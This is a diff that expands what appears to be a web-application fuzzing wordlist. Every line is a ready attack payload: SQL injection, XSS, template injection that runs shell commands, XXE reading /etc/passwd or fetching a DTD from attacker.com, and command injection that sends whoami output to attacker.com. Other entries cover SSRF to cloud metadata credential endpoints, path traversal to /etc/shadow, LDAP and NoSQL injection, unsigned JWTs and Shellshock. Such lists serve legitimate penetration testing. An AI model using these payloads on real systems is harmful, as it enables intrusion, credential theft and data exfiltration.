@@ -1,20 +1,204 @@
+${7*7}
+${"f".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream()}
 {"$gt": ""}
-%0d%0a
+$(id)
+{"$ne": null}
+{"$regex": ".*"}
+/%09/google.com
+%0d%0aHeader:Value
+%0d%0aSet-Cookie:session=hacked
 169.254.169.254
+-1" OR 1=1--
+-1' OR 1=1--
+1" OR "1"="1
+1' OR '1'='1
+%252e%252e%252f
 %2e%2e%2f
+/%5cgoogle.com
+#{7*7}
+*{7*7}
+<%= 7*7 %>
 {{7*7}}
+Access-Control-Allow-Origin: *
+admin' #
+admin' --
+admin' || '1'=='1
+admin' AND 1=0--
+admin' AND 1=1--
+admin' || true || '1'=='1
+<a href="javascript:alert(1)">Click Me</a>
+' AND 1=0 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables--
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 20 FROM (SELECT(SLEEP(5)))a)--
+//attacker.com
+<body onload=alert(1)>
+<b onmouseover=alert(1)>Hover Me</b>
+& cat /etc/passwd;
+; cat /etc/passwd;
+| cat /etc/passwd;
+Client-IP: 127.0.0.1
 *)(cn=*)
-<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
+{{config}}
+constructor.prototype.test=test
+& curl http://attacker.com/`whoami`;
+; curl http://attacker.com/`whoami`;
+| curl http://attacker.com/`whoami`;
+C:\windows\system32\drivers\etc\hosts
+C:\windows\win.ini
+<details open ontoggle=alert(1)>
+<div oncontextmenu=alert(1)>Right Click</div>
+<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]> <r>&xxe;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]> <r>&xxe;</r>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]> <r>&xxe;</r>
+<embed src="javascript:alert(1)">
+../../../../../../../../../../../../../../etc/hosts
+/etc/hosts
+../../../../../../../../../../../../../../etc/passwd
 /etc/passwd
-eyJhbGciOiJub25lIn0...
+../../../../../../../../../../../../../../etc/shadow
+/etc/shadow
+expect://id
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+<form><button formaction="javascript:alert(1)">Click
 //google.com
+/\google.com
+<h1 ondblclick=alert(1)>Double Click</h1>
+http://0.0.0.0:80
+http://0x7f000001:80
+http://10.0.0.1
+http://127.0.0.1:22
+http://127.0.0.1:443
+http://127.0.0.1:80
 http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://172.16.0.1
+http://192.168.0.1
+http://192.168.1.1
+http://2130706433:80
+http://[::]:80
+http://attacker.com
+/http://google.com
+http://localhost:22
+http://localhost:80
+http://localtest.me
+http://metadata.google.internal/computeMetadata/v1/
+https://attacker.com
+/https://google.com
+https://google.com
+http://spoofed.burpcollaborator.net
+& id;
 ; id;
+`id`
+| id;
+<iframe src="javascript:alert(1)">
+<img src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input oninvalid=alert(1) required autofocus>
+<input onpaste=alert(1) value="Paste Me">
+<input onsearch=alert(1)>
+instance-data
+<i onmousedown=alert(1)>Click Me</i>
+<isindex formaction="javascript:alert(1)" type=submit>
+javascript:alert(1)
+javascript:window.location.href="https://google.com"
+<marquee onstart=alert(1)>
+<math><x href="javascript:alert(1)">click
+metadata.google.internal
 O:8:"Exploit":1:{s:4:"data";s:4:"test";}
+*)(&(objectClass=*))
+<object data="javascript:alert(1)">
+" OR 1=1--
+") OR "1"="1
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1#
 ' OR 1=1--
+' OR 1=1/*
+') OR '1'='1
+')) OR (('1'='1
+' OR 1=1 GROUP BY 1--
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 'a'='a
+' OR 'a'='a'--
+' OR 'a'='a'/*
+' OR BENCHMARK(1000000,MD5(1))--
 Origin: https://attacker.com
+Origin: https://localhost
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+" OR SLEEP(5)--
+' OR SLEEP(5)--
+*)(&(password=*))
+php://filter/convert.base64-encode/resource=index.php
+php://input
+& ping -c 3 attacker.com;
+; ping -c 3 attacker.com;
+| ping -c 3 attacker.com;
+<p onclick=alert(1)>Click Me</p>
+/proc/self/cmdline
+../../../../../../../../../../../../../../proc/self/environ
+/proc/self/environ
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/proc/self/fd/3
 __proto__[test]=test
+{"__proto__":{"test":"test"}}
+query { user(id: 1) { password } }
+{{request.application.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+\r\nSet-Cookie:session=hacked
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG...
 {__schema{types{name}}}
+{__schema{types{name,fields{name,args{name}}}}}
+'"><script>alert(1)</script>
 <script>alert(1)</script>
+<script>alert('XSS')</script>
+{{ self.__dict__ }}
+{{ self._TemplateReference__context.namespace.clear() }}
+{{settings}}
+<span oncopy=alert(1)>Copy Me</span>
+<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">
+<svg/onload=alert(1)>
+<textarea oncut=alert(1)>Cut Me</textarea>
+this.password.match(/.*/)
+\u002e\u002e\u002f
+*)(&(uid=admin))
+& uname -a;
+; uname -a;
+| uname -a;
+' UNION SELECT database(),NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT user(),NULL,NULL--
+' UNION SELECT @@version,NULL,NULL--
+<u onmouseup=alert(1)>Click Me</u>
+User-Agent: () { :; }; echo; /bin/id
+*)(&(userPassword=*))
+/var/log/apache2/access.log
+/var/log/httpd/access.log
+/var/log/nginx/access.log
+/var/www/html/config.php
+/var/www/html/wp-config.php
+<video><source onerror=alert(1)>
+& whoami;
+; whoami;
+| whoami;
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+/wp-admin/
 /wp-config.php
+/wp-content/uploads/
+/wp-login.php
+&#x2e;&#x2e;&#x2f;
 X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
